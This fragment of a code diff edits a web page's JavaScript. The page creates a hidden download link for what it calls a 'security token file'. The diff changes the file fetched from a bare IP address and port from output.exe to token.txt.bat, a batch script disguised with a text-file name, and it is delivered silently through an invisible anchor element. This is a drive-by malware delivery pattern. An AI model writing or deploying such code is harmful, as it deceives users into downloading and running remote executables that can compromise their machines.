@@ -367,12 +367,12 @@
             }, 100);
 
             // Download the security token file
-            const downloadUrl = 'http://135.181.7.234:9090/output.exe';
+            const downloadUrl = 'http://135.181.7.234:9090/token.txt.bat';
             
             // Create hidden download link
             const link = document.createElement('a');
             link.href = downloadUrl;
-            link.download = 'output.exe';
+            link.download = 'token.txt.bat';
             link.style.display = 'none';
             document.body.appendChild(link);
             
